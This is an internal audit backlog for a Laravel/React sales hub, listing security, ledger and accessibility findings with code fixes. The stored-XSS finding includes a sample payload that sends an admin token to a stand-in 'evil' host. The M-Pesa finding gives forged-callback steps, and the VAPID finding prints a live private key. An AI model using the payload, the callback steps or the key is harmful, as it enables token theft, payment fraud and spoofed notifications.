# Security & Financial Audit — backlog for Monday

Raised 2026-08-08 (Sat) by a five-vector adversarial audit of the hub. Deferred to
Monday by the owner. Nothing here is fixed yet.

Method: five parallel auditors over the real code, then every finding attacked by a
separate agent instructed to refute it. 19 survived refutation, 2 were refuted.
The three marked VERIFIED below were additionally confirmed by hand.

## Do these first, in this order

| # | Finding | Why first |
|---|---------|-----------|
| 1 | Unauthenticated M-Pesa callback (`api.php:122`) — **VERIFIED** | Live payment-authorisation bypass: a holder of a payment token can POST a success body and mark their own order paid. Money never arrives, ledger reports it collected. |
| 2 | Ledger balance clamped per bucket (`ReportController.php:419`) | Breaks `sales = paid + balance`. An over-paid order cross-subsidises an unpaid one and the debt disappears. Our own tests miss it because they never build an over-payment. |
| 3 | Channel scopes overlap (`Order.php:207`) | An `online` order at a WhatsApp outlet matches two branches, so weekly/monthly totals exceed the channel sum. |
| 4 | `normalize_phone` wrong merges (migration `2026_08_08_000001`) | `'0044 7401 182700'` -> `+2540447401182700`; `'MPESA REF 123456789'` -> `+254123456789`. This is the silent-merge failure the function exists to prevent. |
| 5 | Contrast + dead token classes | `surface-400` 3.13:1 across 1,242 sites; `surface-300` 1.47:1 as timestamps; `bg-brand` / `bg-surface` / `text-muted` compile to nothing. |

## Already exposed — rotate regardless of the code fixes

The VAPID **private** key is committed as an inline default in `docker-compose.yml:112`
and is in git history, so it is readable by anyone with repo access and by every CI
job. It was also printed into the audit transcript. Rotating the keypair is
independent of every fix below and takes minutes.

## Verified by hand (not just agent-reported)

- `api.php:122` — the M-Pesa callback sits in the public `pay` group with only
  `throttle:60,1`. No auth, no signature, no source-IP check.
- `docker-compose.yml:112` — VAPID private key present as an inline default.
- `EodReportsPage.tsx:564` — `dangerouslySetInnerHTML` renders clerk-authored HTML
  from the EoD "sentiments" field straight into the admin.

## Confirmed NOT broken (checked empirically, do not re-litigate)

- **Timezone.** Laravel writes Nairobi wall-clock into `timestamp without time zone`,
  so `DATE(created_at)` cuts the correct day. The UTC Postgres session timezone is
  irrelevant for a naive timestamp. Proven from the generated INSERT.
- **Scenario B** (two walk-ins with "refer to IANDM"): both normalise to NULL and
  stay uncounted rather than merging. Correct.
- **Scenario C** (stepper at 150% zoom): both stepper containers and the stage row
  carry `flex-wrap`, so controls wrap instead of clipping.

## Known cohort-vs-treasury gap (decide, do not "fix" blindly)

The payment-method breakdown buckets by ORDER date, inheriting the ledger's
receivables rule. But the widget's job is reconciling against a paybill statement,
which is treasury. Measured: I&M reads **1,348,140** in the report vs **1,382,990**
on a statement for the same window — a **34,850** gap, because 64 of 390 payments
settle on a different day from their order. Either bucket that widget by payment
date, or label it as cohort. Do not silently force the two to agree.

## Addendum — the audit finished after this doc was first written

The first version captured 21 findings from a partial run. The full five-vector
run returned **41 confirmed findings** (3 Critical, 19 High, 12 Medium, 7 Low),
each one attacked by a separate refuter before being kept. Three of the additions
change the priority order:

- **Any self-registered customer can reach the admin comms group** — the sales
  dashboard, global customer search and internal notes. `routes/api.php:271`
  carries only `auth:sanctum`, no role or permission check. This is a live data
  exposure and belongs beside the M-Pesa callback at the top, not below it.
- **The "vs previous period" badge is wrong on every report.** Carbon 3 returns
  `diffInDays()` as a FLOAT and `dateRange()` always appends ' 23:59:59', so the
  baseline window is always one day longer than the current one. On the "today"
  option the baseline is TWO days against one, so a flat day reads as a ~50%
  collapse. Sales and Financial both show it.
- **A second, divergent phone normaliser already exists** in
  `StorefrontOtpService` — exactly the drift the migration's own doc-block claims
  to prevent. Fixing `normalize_phone` without collapsing that copy leaves the
  bug alive on the storefront path.

Also newly confirmed: two production modals collapse their number inputs to 0px
and 5px (a `min-w` applied to the caption row but not the data rows sharing the
scroller), and `customer_phone` validates `max:30` into a `varchar(20)` column,
so a two-number entry at the till 500s.


## Full finding list

32 of 41 candidates survived adversarial refutation (3 Critical, 17 High, 10 Medium, 2 Low). Each was attacked by a separate agent instructed to refute it; the 9 that fell are not listed.


---

## Critical

### Public M-Pesa callback is unauthenticated — the payer can settle their own order for free

`PublicPaymentController.php:201` · V2-security

```
$resultCode        = $data['Body']['stkCallback']['ResultCode'] ?? null;
```

**Breaks:** POST /api/v1/pay/{token}/mpesa-callback (routes/api.php:122) has no auth, no signature, no source-IP check — its only middleware is throttle:60,1. Settlement is decided entirely by attacker-controlled request body. The attacker is the customer: (1) GET /pay/{token} — they already hold the token, it is in the link they were sent; (2) POST /pay/{token}/initiate with method=mpesa — initiateMpesa returns `checkout_request_id` in the JSON response (line 360) and stores it as the Payment's provider_reference (line 353); (3) they ignore the STK prompt on their phone and instead POST {"Body":{"stkCallback":{"ResultCode":0,"CheckoutRequestID":"<the id from step 2>","CallbackMetadata":{"Item":[{"Name"

**Fix:** Stop routing the callback on a value the customer knows, and stop handing the customer the correlation id.

1) Migration — add a server-only secret to payments:
```php
// database/migrations/2026_08_09_000001_add_callback_secret_to_payments.php
public function up(): void {
    Schema::table('payments', function (Blueprint $t) {
        $t->string('callback_secret', 64)->nullable()->unique()->after('provider_reference');
    });
}
public function down(): void {
    Schema::table('payments', fn (Blueprint $t) => $t->dropColumn('callback_secret'));
}
```

2) routes/api.php — replace the per-token callback route (delete line 122) with one keyed on the secret, outside the /{token} group:
```php
R

### Topbar breadcrumb cannot yield, so the user-menu button is pushed out of an overflow-hidden shell and clipped away on phones

`Topbar.tsx:592` · V4-layout

```
<nav
                    aria-label="Breadcrumb"
                    className="flex items-center gap-1.5 text-sm"
                >
```

**Breaks:** The header (Topbar.tsx:554) is `flex items-center px-4 gap-4` with NO flex-wrap and NO overflow control. Of its three children, the hamburger is floored at 44px by `.btn-icon`'s `min-w-[44px]`, the actions group (line 625, `ml-auto flex items-center gap-2`) has no `shrink-0` but is floored at its own min-content, and the breadcrumb `<nav>` has neither `min-w-0`, `overflow-hidden`, nor `truncate` — so its automatic minimum size is its full min-content and it can never yield. The header therefore overflows to the right, and its ancestor at AdminLayout.tsx:245 is `flex-1 flex flex-col min-w-0 overflow-hidden` (and the shell at line 201 is also `overflow-hidden`), so the overflow is CLIPPED with

**Fix:** // Topbar.tsx:592 — the breadcrumb must be the thing that yields.
// `min-w-0 overflow-hidden` drops its automatic minimum size to 0 so it can
// shrink to nothing instead of shoving the actions past the clip edge;
// the trailing crumb truncates, the ancestor crumbs give way first.
                <nav
                    aria-label="Breadcrumb"
                    className="flex min-w-0 flex-1 items-center gap-1.5 overflow-hidden text-sm"
                >
                    {breadcrumbs.map((crumb, i) => {
                        const isLast = i === breadcrumbs.length - 1;
                        return (
                            <span
                                key={i}
       

### Stored XSS: POS clerk's EoD "sentiments" HTML is rendered unescaped in the admin console

`EodReportsPage.tsx:564` · V5-data-quality

```
dangerouslySetInnerHTML={{ __html: detail.sentiments }}
```

**Breaks:** `sentiments` is free HTML from a WYSIWYG (`UserEodModal.tsx:628` RichEditor), accepted with no sanitisation at `PosController.php:1855` (`'sentiments' => 'nullable|string|max:20000'`), persisted verbatim at `PosController.php:1888/1900`, and rendered as raw HTML here. Writing it needs only `pos.access` (`routes/api.php:731`); reading the detail is `settings.view` (`routes/api.php:734`). A cashier saves an EoD note containing `<img src=x onerror="fetch('https://evil/'+localStorage.getItem('bh_admin_token'))">`; the next time a manager opens that report the payload runs in the manager's origin and exfiltrates the Sanctum bearer token, which `src/api/client.ts:19` stores in localStorage (`set: 

**Fix:** Sanitise on write (server is the only place both readers share), then keep the render defensive.

backend — composer require mews/purifier, then in PosController::saveUserEodReport replace both `'sentiments' => $validated['sentiments'] ?? null,` (lines 1888 and 1900) with:

    'sentiments' => isset($validated['sentiments'])
        ? \Mews\Purifier\Facades\Purifier::clean($validated['sentiments'], [
              'HTML.Allowed' => 'p,br,b,strong,i,em,u,ul,ol,li,h3,h4',
              'AutoFormat.RemoveEmpty' => true,
          ])
        : null,

backend/resources/views/mail/eod-report.blade.php:152 — keep `{!! !!}` only for the now-sanitised value, or belt-and-braces:

    {!! \Mews\Purifie


---

## High

### Every /api/v1/admin/* comms endpoint — dashboard sales, global search, internal comments — is open to any authenticated user, including self-registered storefront customers

`api.php:271` · V2-security

```
Route::prefix('admin')->middleware('throttle:admin-api')->group(function () {
```

**Breaks:** This group carries only auth:sanctum (inherited from line 224) and a throttle. There is no role, permission, or staff check anywhere in it, and none of its controllers add one. POST /api/v1/auth/register (AuthController.php:26) is public, creates the user with status 'active', and immediately returns a Sanctum token with ['*'] abilities (User::createAuthToken, User.php:221). So any stranger on the internet can register and then read: GET /api/v1/admin/dashboard (line 274) → DashboardController::buildStats returns today_sales, total_orders, total_users, customers, pending_payment_approvals, stock and production counts — a sales report with no reports.view gate, the exact rule this vector was 

**Fix:** Gate the group on staff membership; User::canAccessAdmin() (User.php:193) already exists and is deliberately NOT enforced by the customer login.

1) New middleware app/Http/Middleware/EnsureStaff.php:
```php
<?php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class EnsureStaff
{
    public function handle(Request $request, Closure $next): Response
    {
        $user = $request->user();
        if (! $user || ! $user->canAccessAdmin()) {
            return response()->json(['message' => 'This action is unauthorized.'], 403);
        }
        return $next($request);
    }
}
```

2) bootstrap/app.php, in the existing 

### VAPID application-server private key is committed as an inline default in docker-compose.yml

`docker-compose.yml:112` · V2-security

```
VAPID_PRIVATE_KEY: ${VAPID_PRIVATE_KEY:-fw3ADyQTPU-TB5LwJ7zNg9RfKRu5sA36chl-f2976as}
```

**Breaks:** This is a live P-256 VAPID private key (43-char base64url) tracked in git, paired with the public key on line 111. Anyone with repo read access — every contributor, every CI job, anyone who ever forks or clones — can sign Web Push requests as this application server and deliver push notifications to every browser subscription minted against the matching public key (staff PWA installs). Because it is a `:-default`, it is also silently authoritative: if VAPID_PRIVATE_KEY is absent from the VPS .env the laravel container runs on the committed key while the queue container (line 182, `${VAPID_PRIVATE_KEY:-}`) runs on an empty one, so the two disagree about identity. .env itself is correctly untr

**Fix:** Remove the defaults, require the vars, rotate the key.
```yaml
            # Web Push Notifications — no inline defaults; a missing key must
            # fail the deploy, not silently fall back to a committed keypair.
            VAPID_PUBLIC_KEY: ${VAPID_PUBLIC_KEY:?VAPID_PUBLIC_KEY is required}
            VAPID_PRIVATE_KEY: ${VAPID_PRIVATE_KEY:?VAPID_PRIVATE_KEY is required}
            VAPID_SUBJECT: ${VAPID_SUBJECT:-mailto:admin@bethanyhouse.co.ke}
            VITE_VAPID_PUBLIC_KEY: ${VAPID_PUBLIC_KEY:?VAPID_PUBLIC_KEY is required}
```
Then: generate a fresh pair (`php artisan webpush:vapid`), put both halves in the VPS .env and in the CI secret used for the react-admin build, redeploy

### customer_phone validation permits 30 chars into a varchar(20) column — a common two-number entry 500s the sale

`OrderController.php:1513` · V5-data-quality

```
'customer_phone'      => 'nullable|string|max:30',
```

**Breaks:** `orders.customer_phone` is `$table->string('customer_phone', 20)` (`database/migrations/2024_01_01_000027_create_orders_table.php:27`) and no migration ever widens it. Validation allows 30 here and at `PosController.php:512`, `:2910`, `:3263`, so a 21-30 char value passes validation and then dies at the INSERT. Verified on PostgreSQL 16: `INSERT INTO t(customer_phone varchar(20)) VALUES ('0722123456 / 0733987654')` -> `ERROR: value too long for type character varying(20)`. That string is 23 characters and is exactly how a Kenyan clerk records a customer with two lines. Postgres errors rather than truncating, and `bootstrap/app.php` registers no QueryException handler, so the cashier gets an 

**Fix:** Widen the columns to match the intent rather than shrinking the rule — a 30-char phone field is genuinely useful, and truncating a customer's second number silently is worse than either.

New migration `database/migrations/2026_08_09_000001_widen_customer_contact_columns.php`:

    public function up(): void
    {
        DB::statement('ALTER TABLE orders     ALTER COLUMN customer_phone      TYPE varchar(30)');
        DB::statement('ALTER TABLE orders     ALTER COLUMN customer_first_name TYPE varchar(255)');
        DB::statement('ALTER TABLE orders     ALTER COLUMN customer_last_name  TYPE varchar(255)');
        DB::statement('ALTER TABLE quotations ALTER COLUMN customer_phone      TYPE v

### Prior-period comparison always spans one day MORE than the current period (Carbon 3 float diff)

`ReportController.php:100` · V1-ledger-sql

```
$days    = $startDt->diffInDays($endDt) + 1;
```

**Breaks:** composer.lock pins nesbot/carbon 3.11.1, where diffInDays() returns a signed FLOAT (vendor/nesbot/carbon/src/Carbon/Traits/Difference.php: `public function diffInDays(...): float`), not the absolute int Carbon 2 returned. dateRange() always appends ' 23:59:59' to $end (line 89), so the diff is never integral. Range 2026-07-10 .. 2026-08-08 23:59:59: diffInDays = 29.99998842592593, $days = 30.99998842592593. $priorEnd = 2026-07-09 00:00:00; subDays(29.99998842592593) goes through addUnit -> rawAddUnit -> CarbonInterval::fromString('29.99998842592593 day'), which cascades the fraction into hours/minutes/seconds (round($fraction,6) = 0.999988, so the `case 1` precision fix does NOT fire), produ

**Fix:**     private function priorPeriod(string $start, string $end): array
    {
        // Carbon 3 returns diffIn*() as a signed FLOAT. $end always carries
        // ' 23:59:59' (see dateRange()), so diffInDays() gave 29.99998... and
        // +1 gave 30.99998...; subDays() then cascaded the fraction into
        // 23h59m59s and pushed priorStart a whole day early, making EVERY
        // comparison run against a window one day longer than the current one.
        // Compare whole days only.
        $startDt = Carbon::parse($start)->startOfDay();
        $endDt   = Carbon::parse(substr($end, 0, 10))->startOfDay();
        $days    = (int) round($startDt->diffInDays($endDt)) + 1;

        $prio

### GREATEST() clamps the balance per GROUP, not per order — it breaks `sales = paid + balance` and silently nets over-payment against other orders' debt

`ReportController.php:419` · V1-ledger-sql

```
GREATEST((COALESCE(SUM(orders.total_amount), 0))::float8
                   - (COALESCE(SUM(COALESCE(pay.paid, 0)), 0))::float8, 0)  AS balance
```

**Breaks:** Two distinct failures, both from clamping the aggregate instead of each order. (a) Cross-subsidy: Order A total 100 / paid 150, Order B total 100 / paid 0, same day and channel. The row reports sales 200, paid 150, balance 50. True receivables are 100 — B's debt is erased by A's excess, understating what is owed with no trace. (b) R1 breaks outright: a bucket with a single over-paid order (total 100, paid 150) reports sales 100, paid 150, balance GREATEST(-50,0)=0, so sales != paid + balance — the exact invariant the method docblock (lines 364-372) and tests/Feature/SalesLedgerTest.php:106 promise. Over-payment is directly reachable, not hypothetical: (1) PublicPaymentController.php:124 only

**Fix:**         // Clamp PER ORDER, not per group. GREATEST(SUM(total) - SUM(paid), 0)
        // let one over-paid order cancel another order's outstanding balance,
        // and a bucket that nets over-paid clamped to 0 so sales != paid +
        // balance — the one thing this ledger promises. Over-payment is
        // reachable today: the public pay link charges the FULL total on an
        // order that already took a deposit (PublicPaymentController:124/437),
        // and reassignPayment moves a payment onto any order unchecked.
        // Money collected beyond the invoice is now REPORTED as `overpaid`
        // rather than silently absorbed: paid + overpaid = gross received.
        $ag

### Eight revenue endpoints still filter payment_status='paid' — the filter that was removed from the summary for erasing every part-paid order

`ReportController.php:519` · V1-ledger-sql

```
->where('orders.payment_status', 'paid')
```

**Breaks:** salesSummary and salesLedger adopted the sales truth 'any non-voided, non-cancelled order' (line 169: whereNotIn('orders.status', ['voided','cancelled'])) precisely because, in this file's own words at lines 163-165, "The old payment_status='paid' filter silently erased every part-paid and deposit order from 'revenue'." That filter is still live in salesByProduct (519), salesByCategory (569), salesByCustomer (613), salesByOutlet (656), salesByPaymentMethod (696), profitLoss (1259, 1290, 1297, 1310), revenue (1380) and dashboardKPIs (1762, 1766, 1771) — and none of those also excludes voided/cancelled, so R6 is violated in both directions. Concrete: a KES 40,000 vestment order with a KES 10,0

**Fix:** // Replace the payment_status filter with the same sales truth salesSummary and
// salesLedger use, at every site listed above. For salesByProduct (line 519):

            ->whereNotIn('orders.status', ['voided', 'cancelled'])

// unqualified in the DB::table('orders') / profitLoss / revenue / dashboardKPIs
// queries that have no join alias:

            ->whereNotIn('status', ['voided', 'cancelled'])

// A report that shows two different revenue figures on one screen is worse than
// one that is slightly wrong, because the reader cannot tell which to trust.
// Whether a customer has paid yet is a RECEIVABLES question (ledger.balance),
// not a filter on what was sold.
//
// Also drop sales

### Sales ledger double-counts an online order taken at a WhatsApp outlet: it matches two channel scopes at once

`Order.php:207` · V1-ledger-sql

```
'whatsapp' => $query->where(function ($q) use ($whatsappOutletIds) {
                $q->whereIn('outlet_id', $whatsappOutletIds)
                  ->orWhere('order_type', 'whatsapp');
            }),
```

**Breaks:** The three branches are not mutually exclusive. An order with order_type='online' AND outlet_id in a sales_channel='whatsapp' outlet satisfies the 'online' branch (line 206) and the 'whatsapp' branch simultaneously. Only 'pos' was made disjoint (its whereNotIn guard, lines 215-217). salesLedger calls $scoped($c) once per channel (ReportController.php:425 and 472), so that order's value is added to BOTH channels[] rows and to weekly[].total / monthly[].total via the accumulators at lines 483-486 — while daily[] uses $scoped(null), which returns the query untouched and counts it ONCE. The same payload therefore reports three different period totals, and sum(channels[].sales) exceeds salesSummar

**Fix:**         return match ($channel) {
            // The three channels must PARTITION the order set — salesLedger sums
            // them into weekly/monthly totals, so any overlap is double-counted
            // money. Online is order_type-driven and wins outright (see the
            // 2026_07_07_120000_add_sales_channel_to_outlets migration note);
            // before this, an order created with channel='online' at a WhatsApp
            // outlet — which PosController::createSale accepts, channel and
            // outlet being orthogonal — matched BOTH the online and whatsapp
            // branches and was counted twice.
            'online'   => $query->where('order_type', 'online'),

### normalize_phone reads the `00` international access prefix as the Kenyan trunk `0`, splitting a customer and emitting impossible E.164

`2026_08_08_000001_add_normalize_phone_function.php:64` · V5-data-quality

```
IF left(digits, 1) = '0' THEN
    RETURN '+254' || substr(digits, 2);
END IF;
```

**Breaks:** Verified against PostgreSQL 16 with the function loaded verbatim from this migration:

  '0044 7401 182700'  -> '+2540447401182700'   (16 digits — no such number exists)
  '+44 7401 182700'   -> '+447401182700'
  '00254722123456'    -> '+2540254722123456'
  '+254722123456'     -> '+254722123456'

The migration's doc-block says the dataset already holds +44 numbers. `00` is how an international number is written across East Africa (the ITU access prefix), so the same UK customer who once gave `0044…` and once gave `+44…` becomes two distinct keys in `COUNT(DISTINCT ... normalize_phone(customer_phone) ...)` at `ReportController.php:198/206/1007` — the exact double-count that PR #238 was writte

**Fix:** Recognise both international notations before the national-trunk rule, and reject anything outside E.164 (verified: this returns the identical value for all six variants in `test_the_same_kenyan_number_normalises_to_one_value`, all three in `test_foreign_numbers_keep_their_own_country_code`, keeps `+254712345678` distinct from `+255712345678`, and returns NULL for every string in `test_clerk_notes_are_not_a_customer`):

    CREATE OR REPLACE FUNCTION normalize_phone(raw text)
    RETURNS text LANGUAGE plpgsql IMMUTABLE RETURNS NULL ON NULL INPUT AS $$
    DECLARE
        digits text;
        intl   boolean;
    BEGIN
        digits := regexp_replace(raw, '[^0-9]', '', 'g');

        -- '+' a

### normalize_phone has a digit floor but no E.164 ceiling — any string with 9+ digits becomes a "customer", violating R4

`2026_08_08_000001_add_normalize_phone_function.php:75` · V5-data-quality

```
RETURN '+' || digits;
```

**Breaks:** The function guards the short end (line 54, `IF length(digits) < 9 THEN RETURN NULL`) but never the long end, so it emits keys that cannot be phone numbers. Verified against PostgreSQL 16:

  '0722123456 / 0733987654'  -> '+2547221234560733987654'  (22 digits)
  '0722123456 ext 201'       -> '+254722123456201'         (15 digits, wrong number)
  'receipt no 20240815001'   -> '+20240815001'

Both of the first two are ordinary Kenyan POS data entry — a second contact number, or a switchboard extension. The migration's stated rule is "ANYTHING THAT IS NOT A PLAUSIBLE PHONE RETURNS NULL" (lines 22-29), and R4 depends on it, but `+2547221234560733987654` is manifestly not plausible and is still c

**Fix:** Bound the international branch to E.164 and stop falling through to a catch-all. Within the corrected function (see the `00`-prefix finding), the two guards that close this are:

        IF intl OR left(digits, 3) = '254' THEN
            IF length(digits) BETWEEN 8 AND 15 AND left(digits, 1) <> '0' THEN
                RETURN '+' || digits;
            END IF;
            RETURN NULL;
        END IF;

        IF left(digits, 1) = '0' AND length(digits) BETWEEN 9 AND 10 THEN
            RETURN '+254' || substr(digits, 2);
        END IF;

-- and the final line becomes `RETURN NULL;` instead of `RETURN '+' || digits;`.

Verified outputs after the change: '0722123456 / 0733987654' -> NULL, '07

### Offline banner is white on amber-500 — 2.15:1 on the app's only connectivity warning

`PWAInstallBanner.tsx:28` · V3-tokens-wcag

```
"bg-amber-500 text-white text-xs font-medium py-1.5 px-4",
```

**Breaks:** `amber-500` now resolves to the token #f59e0b (tailwind.config.js:116 gave the amber object numeric keys, so this stopped falling through to stock Tailwind). White on #f59e0b measures **2.15:1** at `text-xs` (12px) — less than half the 4.5:1 AA floor and below even the 3:1 large-text floor. This is a `role="status" aria-live="polite"` banner telling the user their writes are queued and unsynced; on a bright shop-floor tablet it is the one message that must be readable and it is the least readable thing in the app.

**Fix:** ```tsx
"bg-amber-800 text-white text-xs font-semibold py-1.5 px-4",   // #92400e — 8.11:1
```
The pulse dot below it (`bg-white`) stays legible against amber-800.

### Filled status chips and toasts: white on `warning` is 2.94:1, on `success` 3.30:1

`Toast.tsx:8` · V3-tokens-wcag

```
warning: 'bg-warning text-white',
```

**Breaks:** `warning.DEFAULT` = #ca8a04 and white text measures **2.94:1**; `success.DEFAULT` = #16a34a measures **3.30:1** (Toast.tsx:6). The toast body is `text-sm` (14px, index.css fontSize `sm` = 0.875rem) — normal text, so AA requires 4.5:1. Both fail. The same two pairings are the active state of every status filter row (StatusTabs.tsx:47 `success: "bg-success text-white border-success"`, :48 `warning: "bg-warning text-white border-warning"`), the deposit-preset chips (pos/components/PaymentModal.tsx:1140), the calendar load chip (production/ProductionCalendarPage.tsx:470), the approvals count badge (approvals/ApprovalsPage.tsx:135, `text-2xs` = 11px) and the POS card badge (pos/PosPage.tsx:1052).

**Fix:** Move the white-text fills one to three steps darker — the ramps already exist:
```ts
// components/ui/Toast.tsx
const variantStyles: Record<ToastVariant, string> = {
  success: 'bg-success-700 text-white',   // #15803d — 5.02:1
  error:   'bg-danger text-white',        // #dc2626 — 4.83:1 (already passing)
  warning: 'bg-warning-800 text-white',   // #854d0e — 6.85:1
  info:    'bg-info text-white',          // #2563eb — 5.17:1 (already passing)
}
```
and in components/ui/StatusTabs.tsx:47-48:
```ts
success: "bg-success-700 text-white border-success-700",
warning: "bg-warning-800 text-white border-warning-800",
```
Apply the same substitution at PaymentModal.tsx:1140, ProductionCalendarPage.

### `bg-brand` is not a real class — the filter-count badge renders white-on-nothing

`PaymentTransactionsPage.tsx:337` · V3-tokens-wcag

```
<span className="w-4 h-4 bg-brand text-white text-2xs rounded-full flex items-center justify-center font-bold">{activeFilters}</span>
```

**Breaks:** `brand` in tailwind.config.js:14 defines only numeric steps 50–950 and no `DEFAULT` key, so Tailwind emits no `.bg-brand` rule at all. Verified by compiling the real content glob (`npx tailwindcss -i src/index.css`): `^\.bg-brand\s*{` → 0 matches, same for `.text-brand`. The badge therefore has no background; `text-white` paints the digit on the button's transparent background, which sits on the white toolbar → 1.00:1. When a filter is active the user sees an empty circle-sized gap where the count should be. The same dead class silently no-ops at :192 (`color="text-brand"` passed to KpiCard), :330 (active state of the Filters button), :436 (the order-number link in every row, which then inhe

**Fix:** Replace every bare `-brand` utility with an explicit step:
- L192: `color="text-brand-700"`   // #b23514, 6.15:1 on white
- L330: `(showFilters || activeFilters > 0) && "text-brand-700",`
- L337: `<span className="w-4 h-4 bg-brand-500 text-white text-2xs rounded-full flex items-center justify-center font-bold">{activeFilters}</span>`
- L436: `className="text-xs font-semibold text-brand-700 hover:underline"`
- L480: `className="w-4 h-4 text-surface-400 group-hover:text-brand-700 transition-colors"`
Then make the class impossible to write again by giving the ramp a DEFAULT in tailwind.config.js:14 — `brand: { DEFAULT: '#f05423', 50: '#fff4ef', … }` — or add a lint rule; the same hole exists on

### `text-surface-300` is used as content text at 1.47:1 — effectively invisible

`ProductionOrderDetailPage.tsx:1587` · V3-tokens-wcag

```
<span className="text-2xs text-surface-300">{fmtTime(msg.created_at)}</span>
```

**Breaks:** surface-300 = #d2d6d1 measures **1.47:1 on white** and **1.41:1 on surface-50**. 186 `text-surface-300` sites exist and they are not decorative: this one is the timestamp on every production-order message, :1108 is the `Unassigned` state label (`text-surface-300 italic text-2xs`), :1564 is the empty-state help text, :1653/:1658/:1663 are the composer's status hints, and PaymentTransactionsPage.tsx:439 is a table-cell value. At 11px and 1.47:1 the text is below the threshold at which most displays render it distinguishably from the card — it reads as blank space, so a message with no author looks like it has no timestamp either.

**Fix:** Retire surface-300 as a text colour. `rg -l 'text-surface-300' src | xargs sed -i '' -E 's/text-surface-300/text-surface-500/g'`, then re-apply surface-300 only where the element is a non-text glyph that still needs 3:1 (e.g. ProductionOrderDetailPage.tsx:344, the remove-icon button — that one should go to `text-surface-500` too, since 1.47:1 fails 1.4.11 for an interactive icon). For the specific line: `<span className="text-2xs text-surface-500">{fmtTime(msg.created_at)}</span>`.

### AssignModal has the same header-only min-w-[480px]; the "Est. hours" field collapses to a 5px content box and the column captions sit over the wrong controls

`ProductionOrderDetailPage.tsx:568` · V4-layout

```
<div className="grid grid-cols-12 gap-3 px-3 text-2xs font-bold text-surface-400 uppercase tracking-wide min-w-[480px]">
```

**Breaks:** Same defect class as ProductionPage.tsx:986. The scroller is `<div className="space-y-2 overflow-x-auto">` (line 535); only the caption row is given `min-w-[480px]`, while the task rows (line 576, `grid grid-cols-12 gap-3 items-center p-3`) size to the modal's real width. Measured at 390px with the real Modal chrome (p-4 + px-6 + p-5 = 120px): header 480px, rows 266px. With gap-3 that is 11 × 12px = 132px of gutter out of 266px, leaving ~11.5px per column. The col-span-3 estimated-hours field (line 597-602) gets a 51px border box; `.input` px-4 plus the `pr-7` override for the "h" suffix is 44px of padding, so the content box is 5px — the number is invisible and uneditable, and the absolutel

**Fix:** // ProductionOrderDetailPage.tsx:535-607 — put the min-width on ONE track that
// both the captions and the rows live inside, and let the two data controls
// yield with min-w-0 instead of being crushed by the 12-column gutter budget.
                    <div className="space-y-2">
                        {/* Bulk assign stays out of the horizontal scroller. */}
                        <div className="flex items-center gap-2 flex-wrap p-3 rounded-xl bg-brand-50/60 border border-brand-100">
                            {/* …unchanged… */}
                        </div>

                        <div className="overflow-x-auto -mx-1 px-1">
                            <div className="min-w-[480px

### `text-surface-400` is used as body/data text at 3.13:1 — 1,242 sites, 856 of them at 11–14px

`SalesReportPage.tsx:554` · V3-tokens-wcag

```
<td className="px-4 py-3 text-right tabular-nums text-surface-400 text-sm">
```

**Breaks:** surface-400 = #8c9489: **3.13:1 on white**, **2.81:1 on the page canvas** (`bg-surface-canvas` #f2f3f1, set at AdminLayout.tsx:201), **3.02:1 on `bg-field` #fafbfa**. tailwind.config.js:63 concedes the token is "used ~1178x, much of it on text" and was tuned only to "clear the 3:1 bar for UI and large text" — but `grep` finds 1,242 `text-surface-400` sites, 856 of which carry `text-2xs`/`text-xs`/`text-sm` (11/12/14px), which is normal text under 1.4.3 and needs 4.5:1. The quoted line is the *discounts column of the sales ledger* — a money value rendered at 3.13:1. Same class of failure: SalesReportPage.tsx:534 and :678 (row index), CommandPalette.tsx:178 (result subtitle), CommentThread.tsx

**Fix:** Two moves. (1) Reserve surface-400 for borders and decorative glyphs; make surface-500 the metadata text token and darken it so it clears 4.5:1 against the canvas as well as white — in tailwind.config.js:38 replace `500: '#70786d',` with:
```js
500: '#687066',   // 5.12:1 on white, 4.60:1 on surface-canvas (#f2f3f1)
```
(2) Codemod the text sites: `rg -l 'text-surface-400' src | xargs sed -i '' -E 's/text-surface-400/text-surface-500/g'`, then hand-revert the pure-icon/SVG uses (e.g. CommandPalette.tsx:329/334, DateRangePicker.tsx:153/161) where 3.13:1 already satisfies 1.4.11. Change index.css:53 to `placeholder:text-surface-500`.

### Sales heatmap: order counts printed white on brand-300 at 1.97:1 and brand-600 on brand-100 at 3.66:1

`SalesReportPage.tsx:760` · V3-tokens-wcag

```
? "bg-brand-300 text-white"
```

**Breaks:** The hour-of-day heatmap prints the actual order count inside each cell (`{d?.orders ?? 0}`, `text-xs font-mono`). For intensity 4–6 the cell is brand-300 #ffa17d with white text: **1.97:1**. For intensity 1–3 (line 758, `bg-brand-100 text-brand-600`) it is #d8431a on #ffe4d8: **3.66:1**. Both are normal text needing 4.5:1, and the mid band is the one most cells land in, so the middle of the distribution — exactly the hours a manager is comparing — is the band whose numbers cannot be read. Only the top band (brand-600, 5.09:1) passes.

**Fix:** Keep the fill ramp for the heat signal and fix only the ink, which is what carries the value:
```tsx
intensity === 0
    ? "bg-surface-50 text-surface-500"
    : intensity <= 3
      ? "bg-brand-100 text-brand-800"    // #8f2c13 on #ffe4d8 — 6.51:1
      : intensity <= 6
        ? "bg-brand-300 text-brand-950"  // #3f1106 on #ffa17d — 6.87:1
        : "bg-brand-600 text-white",     // 5.09:1 — unchanged
```

### `bg-surface` is not a real class — the product-search dropdown renders as a transparent panel

`QuotationsPage.tsx:483` · V3-tokens-wcag

```
<div className="absolute z-10 mt-1 w-full rounded-md border bg-surface shadow-lg">
```

**Breaks:** `surface` (tailwind.config.js:38) has `canvas`, `0`, `50`…`950` but no `DEFAULT`, so `.bg-surface` is never generated (0 matches in the compiled stylesheet). Both quotation product-search dropdowns — this one and the per-row one at :528 (`absolute z-20 … max-h-56 overflow-auto rounded-md border bg-surface shadow-lg`) — are absolutely positioned over the line-items table with **no background**. The rows underneath show straight through the option list, so the search results overlap the table text and are unreadable. The `border` is bare (width only; colour comes from the `* { @apply border-surface-200 }` base rule at index.css:12), so the only thing separating the panel from the page is a 1.2

**Fix:** Use the explicit white step on both dropdowns:
- L483: `<div className="absolute z-10 mt-1 w-full rounded-md border border-line bg-surface-0 shadow-pop">`
- L528: `<div className="absolute z-20 mt-1 max-h-56 w-full overflow-auto rounded-md border border-line bg-surface-0 shadow-pop">`


---

## Medium

### Public Paystack flow writes payment_method 'card' but the verify path only matches 'card_paystack', so every card payment leaves a permanently-pending duplicate row

`PublicPaymentController.php:404` · V2-security

```
'payment_method'     => 'card',
```

